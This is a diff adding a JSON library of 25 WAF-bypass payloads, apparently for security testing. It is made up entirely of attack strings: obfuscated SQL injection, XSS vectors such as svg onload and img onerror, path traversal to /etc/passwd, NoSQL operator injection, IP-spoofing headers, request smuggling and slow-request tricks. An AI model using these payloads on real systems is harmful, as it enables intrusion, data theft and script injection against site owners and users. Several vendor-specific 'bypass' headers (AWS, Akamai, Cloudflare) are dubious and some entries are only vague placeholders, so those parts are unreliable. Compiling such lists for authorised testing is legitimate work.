@@ -1,0 +1,464 @@
+{
+    "category": "WAF Bypass",
+    "description": "Web Application Firewall bypass techniques and payloads for security testing",
+    "payloads": [
+        {
+            "id": "waf-bypass-001",
+            "title": "Case Variation",
+            "payload": "SeLeCt\nuNiOn\nOrDeR bY\nWHeRe",
+            "category": "WAF Bypass",
+            "subcategory": "Case Manipulation",
+            "context": [
+                "sql",
+                "input"
+            ],
+            "level": "low",
+            "tags": [
+                "case",
+                "mixed",
+                "basic"
+            ],
+            "notes": "Basic case variation to bypass case-sensitive WAF rules",
+            "source": "manual"
+        },
+        {
+            "id": "waf-bypass-002",
+            "title": "URL Encoding",
+            "payload": "%53%45%4C%45%43%54 (SELECT)\n%55%4E%49%4F%4E (UNION)\n%27 (')\n%22 (\")",
+            "category": "WAF Bypass",
+            "subcategory": "Encoding",
+            "context": [
+                "url",
+                "input"
+            ],
+            "level": "low",
+            "tags": [
+                "url",
+                "encoding",
+                "hex"
+            ],
+            "notes": "URL encode characters to bypass WAF pattern matching",
+            "source": "manual"
+        },
+        {
+            "id": "waf-bypass-003",
+            "title": "Double URL Encoding",
+            "payload": "%2527 (%27 -> ')\n%252F (%2F -> /)\n%253C (%3C -> <)\n%253E (%3E -> >)",
+            "category": "WAF Bypass",
+            "subcategory": "Encoding",
+            "context": [
+                "url",
+                "input"
+            ],
+            "level": "medium",
+            "tags": [
+                "double",
+                "encoding",
+                "url"
+            ],
+            "notes": "Double URL encoding for WAFs that decode once",
+            "source": "manual"
+        },
+        {
+            "id": "waf-bypass-004",
+            "title": "Unicode/UTF-8 Encoding",
+            "payload": "\\u0027 (')\n\\u003c (<)\n\\u003e (>)\n%u0027 (')",
+            "category": "WAF Bypass",
+            "subcategory": "Encoding",
+            "context": [
+                "input"
+            ],
+            "level": "medium",
+            "tags": [
+                "unicode",
+                "utf8",
+                "encoding"
+            ],
+            "notes": "Unicode encoding variations",
+            "source": "manual"
+        },
+        {
+            "id": "waf-bypass-005",
+            "title": "HTML Entity Encoding",
+            "payload": "&lt; (<)\n&gt; (>)\n&quot; (\")\n&#39; (')\n&#x27; (')",
+            "category": "WAF Bypass",
+            "subcategory": "Encoding",
+            "context": [
+                "html",
+                "input"
+            ],
+            "level": "medium",
+            "tags": [
+                "html",
+                "entity",
+                "encoding"
+            ],
+            "notes": "HTML entities to bypass WAF",
+            "source": "manual"
+        },
+        {
+            "id": "waf-bypass-006",
+            "title": "SQL Comment Injection",
+            "payload": "SEL/**/ECT\nUN/**/ION\n/*!50000SELECT*/\n--\n#\n/**/",
+            "category": "WAF Bypass",
+            "subcategory": "SQL Bypass",
+            "context": [
+                "sql"
+            ],
+            "level": "medium",
+            "tags": [
+                "sql",
+                "comment",
+                "inline"
+            ],
+            "notes": "Use SQL comments to break up keywords",
+            "source": "manual"
+        },
+        {
+            "id": "waf-bypass-007",
+            "title": "Whitespace Alternatives",
+            "payload": "SELECT%09*%09FROM (tab)\nSELECT%0A*%0AFROM (newline)\nSELECT%0D*%0DFROM (carriage return)\nSELECT%0B*%0BFROM (vertical tab)",
+            "category": "WAF Bypass",
+            "subcategory": "Whitespace",
+            "context": [
+                "sql",
+                "input"
+            ],
+            "level": "medium",
+            "tags": [
+                "whitespace",
+                "tab",
+                "newline"
+            ],
+            "notes": "Alternative whitespace characters",
+            "source": "manual"
+        },
+        {
+            "id": "waf-bypass-008",
+            "title": "Null Byte Injection",
+            "payload": "%00\n\\x00\n\\0\n&#0;",
+            "category": "WAF Bypass",
+            "subcategory": "Special Characters",
+            "context": [
+                "input"
+            ],
+            "level": "medium",
+            "tags": [
+                "null",
+                "byte",
+                "terminator"
+            ],
+            "notes": "Null byte to terminate string processing early",
+            "source": "manual"
+        },
+        {
+            "id": "waf-bypass-009",
+            "title": "HTTP Parameter Pollution",
+            "payload": "?id=1&id=1' OR '1'='1\n?id=1&id=2\n?id[]=1&id[]=2",
+            "category": "WAF Bypass",
+            "subcategory": "HPP",
+            "context": [
+                "url",
+                "parameter"
+            ],
+            "level": "medium",
+            "tags": [
+                "hpp",
+                "parameter",
+                "pollution"
+            ],
+            "notes": "Multiple same parameters - WAF checks first, app uses last",
+            "source": "manual"
+        },
+        {
+            "id": "waf-bypass-010",
+            "title": "Content-Type Bypass",
+            "payload": "Content-Type: application/json\nContent-Type: text/xml\nContent-Type: multipart/form-data\nContent-Type: application/x-www-form-urlencoded;charset=ibm037",
+            "category": "WAF Bypass",
+            "subcategory": "Header Manipulation",
+            "context": [
+                "header"
+            ],
+            "level": "medium",
+            "tags": [
+                "content-type",
+                "header",
+                "charset"
+            ],
+            "notes": "Change content type - WAF might not parse all formats",
+            "source": "manual"
+        },
+        {
+            "id": "waf-bypass-011",
+            "title": "HTTP Method Override",
+            "payload": "X-HTTP-Method-Override: PUT\nX-HTTP-Method: DELETE\nX-Method-Override: PATCH",
+            "category": "WAF Bypass",
+            "subcategory": "Header Manipulation",
+            "context": [
+                "header"
+            ],
+            "level": "medium",
+            "tags": [
+                "method",
+                "override",
+                "header"
+            ],
+            "notes": "Override HTTP method via headers",
+            "source": "manual"
+        },
+        {
+            "id": "waf-bypass-012",
+            "title": "Chunked Transfer Encoding",
+            "payload": "Transfer-Encoding: chunked\n\n5\nSELEC\n1\nT\n0",
+            "category": "WAF Bypass",
+            "subcategory": "HTTP Smuggling",
+            "context": [
+                "header",
+                "body"
+            ],
+            "level": "high",
+            "tags": [
+                "chunked",
+                "transfer",
+                "smuggling"
+            ],
+            "notes": "Use chunked encoding to split payload",
+            "source": "manual"
+        },
+        {
+            "id": "waf-bypass-013",
+            "title": "XSS WAF Bypass - SVG",
+            "payload": "<svg/onload=alert(1)>\n<svg onload=alert(1)//\n<svg/onload=alert`1`>",
+            "category": "WAF Bypass",
+            "subcategory": "XSS Bypass",
+            "context": [
+                "html"
+            ],
+            "level": "medium",
+            "tags": [
+                "xss",
+                "svg",
+                "onload"
+            ],
+            "notes": "SVG-based XSS to bypass script tag filters",
+            "source": "manual"
+        },
+        {
+            "id": "waf-bypass-014",
+            "title": "XSS WAF Bypass - Event Handlers",
+            "payload": "<img src=x onerror=alert(1)>\n<body onpageshow=alert(1)>\n<input onfocus=alert(1) autofocus>\n<marquee onstart=alert(1)>",
+            "category": "WAF Bypass",
+            "subcategory": "XSS Bypass",
+            "context": [
+                "html"
+            ],
+            "level": "medium",
+            "tags": [
+                "xss",
+                "event",
+                "handler"
+            ],
+            "notes": "Less common event handlers",
+            "source": "manual"
+        },
+        {
+            "id": "waf-bypass-015",
+            "title": "Path Traversal Bypass",
+            "payload": "....//....//etc/passwd\n..%252f..%252f\n..%c0%af..%c0%af\n..\\\\..\\\\",
+            "category": "WAF Bypass",
+            "subcategory": "LFI Bypass",
+            "context": [
+                "path",
+                "input"
+            ],
+            "level": "medium",
+            "tags": [
+                "lfi",
+                "traversal",
+                "path"
+            ],
+            "notes": "Path traversal with encoding variations",
+            "source": "manual"
+        },
+        {
+            "id": "waf-bypass-016",
+            "title": "IP Header Spoofing",
+            "payload": "X-Forwarded-For: 127.0.0.1\nX-Real-IP: 127.0.0.1\nX-Originating-IP: [127.0.0.1]\nTrue-Client-IP: 127.0.0.1\nClient-IP: 127.0.0.1",
+            "category": "WAF Bypass",
+            "subcategory": "Header Manipulation",
+            "context": [
+                "header"
+            ],
+            "level": "medium",
+            "tags": [
+                "ip",
+                "spoof",
+                "header"
+            ],
+            "notes": "Spoof source IP to appear as localhost/trusted",
+            "source": "manual"
+        },
+        {
+            "id": "waf-bypass-017",
+            "title": "JSON Injection",
+            "payload": "{\"id\":\"1 OR 1=1\"}\n{\"id\":{\"$ne\":1}}\n{\"id\":{\"$gt\":\"\"}}\n{\"id\":[1,2,3]}",
+            "category": "WAF Bypass",
+            "subcategory": "JSON",
+            "context": [
+                "json"
+            ],
+            "level": "medium",
+            "tags": [
+                "json",
+                "nosql",
+                "injection"
+            ],
+            "notes": "JSON-specific injection patterns",
+            "source": "manual"
+        },
+        {
+            "id": "waf-bypass-018",
+            "title": "Oversized Payload",
+            "payload": "[Send payload larger than WAF buffer]\nAAAAA....[8000+ chars]....AAAA' OR 1=1--",
+            "category": "WAF Bypass",
+            "subcategory": "Buffer",
+            "context": [
+                "input"
+            ],
+            "level": "high",
+            "tags": [
+                "buffer",
+                "overflow",
+                "large"
+            ],
+            "notes": "Exceed WAF buffer size so payload isn't fully inspected",
+            "source": "manual"
+        },
+        {
+            "id": "waf-bypass-019",
+            "title": "Slow POST/Slowloris",
+            "payload": "[Send data very slowly byte-by-byte]",
+            "category": "WAF Bypass",
+            "subcategory": "Timing",
+            "context": [
+                "http"
+            ],
+            "level": "high",
+            "tags": [
+                "slow",
+                "timing",
+                "dos"
+            ],
+            "notes": "Slow request might timeout WAF inspection",
+            "source": "manual"
+        },
+        {
+            "id": "waf-bypass-020",
+            "title": "Protocol-Level Bypass",
+            "payload": "HTTP/0.9 request\nHTTP/1.0 without Host header\nInvalid HTTP version",
+            "category": "WAF Bypass",
+            "subcategory": "Protocol",
+            "context": [
+                "http"
+            ],
+            "level": "high",
+            "tags": [
+                "protocol",
+                "http",
+                "version"
+            ],
+            "notes": "Use unusual HTTP protocol versions",
+            "source": "manual"
+        },
+        {
+            "id": "waf-bypass-021",
+            "title": "Cloudflare Bypass Headers",
+            "payload": "CF-Connecting-IP: 127.0.0.1\nX-Forwarded-Host: target.com\nOrigin: https://target.com",
+            "category": "WAF Bypass",
+            "subcategory": "CDN Bypass",
+            "context": [
+                "header"
+            ],
+            "level": "high",
+            "tags": [
+                "cloudflare",
+                "cdn",
+                "bypass"
+            ],
+            "notes": "Headers that might bypass Cloudflare WAF",
+            "source": "manual"
+        },
+        {
+            "id": "waf-bypass-022",
+            "title": "AWS WAF Bypass",
+            "payload": "X-Amz-Waf-Action: allow\n[Use regional endpoint instead of global]",
+            "category": "WAF Bypass",
+            "subcategory": "CDN Bypass",
+            "context": [
+                "header"
+            ],
+            "level": "high",
+            "tags": [
+                "aws",
+                "waf",
+                "bypass"
+            ],
+            "notes": "AWS WAF specific bypass techniques",
+            "source": "manual"
+        },
+        {
+            "id": "waf-bypass-023",
+            "title": "Akamai Bypass Headers",
+            "payload": "Pragma: akamai-x-cache-on\nX-Akamai-Debug: true",
+            "category": "WAF Bypass",
+            "subcategory": "CDN Bypass",
+            "context": [
+                "header"
+            ],
+            "level": "high",
+            "tags": [
+                "akamai",
+                "cdn",
+                "bypass"
+            ],
+            "notes": "Akamai specific bypass headers",
+            "source": "manual"
+        },
+        {
+            "id": "waf-bypass-024",
+            "title": "SQL Function Alternatives",
+            "payload": "CONCAT() -> CONCAT_WS()\nSUBSTRING() -> SUBSTR() -> MID()\nASCII() -> ORD()\nSLEEP() -> BENCHMARK()",
+            "category": "WAF Bypass",
+            "subcategory": "SQL Bypass",
+            "context": [
+                "sql"
+            ],
+            "level": "medium",
+            "tags": [
+                "sql",
+                "function",
+                "alternative"
+            ],
+            "notes": "Use alternative SQL functions not in WAF blocklist",
+            "source": "manual"
+        },
+        {
+            "id": "waf-bypass-025",
+            "title": "Scientific Notation",
+            "payload": "1e0union select\n1.0union select\n1E0UNION SELECT",
+            "category": "WAF Bypass",
+            "subcategory": "SQL Bypass",
+            "context": [
+                "sql"
+            ],
+            "level": "high",
+            "tags": [
+                "scientific",
+                "notation",
+                "sql"
+            ],
+            "notes": "Scientific notation to avoid space between number and keyword",
+            "source": "manual"
+        }
+    ]
+}
